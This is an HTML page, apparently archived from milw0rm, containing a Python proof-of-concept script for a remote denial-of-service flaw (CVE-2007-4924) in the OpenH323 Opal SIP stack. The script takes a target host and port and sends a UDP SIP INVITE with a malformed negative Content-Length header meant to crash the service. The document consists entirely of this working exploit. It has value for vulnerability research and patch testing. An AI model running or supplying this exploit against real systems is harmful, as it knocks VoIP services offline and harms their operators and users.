<html><head><title>OpenH323 Opal SIP Protocol Remote Denial of Service Exploit</title></head><pre>#!/usr/bin/env python
#
# OpenH323 Opal SIP Protocol Remote Denial of Service Vulnerability (CVE-2007-4924)
#
# opal228_dos.py by Jose Miguel Esparza
# 2007-10-08 S21sec labs

import sys,socket

if len(sys.argv) != 3:
	sys.exit(&quot;Usage: &quot; + sys.argv[0] + &quot; target_host target_port\n&quot;)
target = sys.argv[1]
targetPort = int(sys.argv[2])
malformedRequest = &quot;INVITE sip:paco@192.168.1.134 SIP/2.0\r\n&quot;+\
		   &quot;Call-ID:f81d4fae-7dec-11d0-a765-00a0c91e6bf6@foo.bar.com\r\n&quot;+\
		   &quot;Contact:sip:pepe@192.168.1.133:5060\r\n&quot;+\
		   &quot;Content-Length:-40999990\r\n&quot;+\
		   &quot;Content-Type:application/sdp\r\n&quot;+\
		   &quot;CSeq:4321 INVITE\r\n&quot;+\
		   &quot;From:sip:pepe@192.168.1.133:5060;tag=a48s\r\n&quot;+\
		   &quot;Max-Forwards:70\r\n&quot;+\
       	&quot;To:sip:paco@micasa.com\r\n&quot;+\
       	&quot;Via:SIP/2.0/UDP 192.168.1.133:5060;branch=z9hG4bK74b76\r\n\r\n&quot;		 

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect((target,targetPort))
s.sendall(malformedRequest)
s.close()

# milw0rm.com [2009-07-24]</pre></html>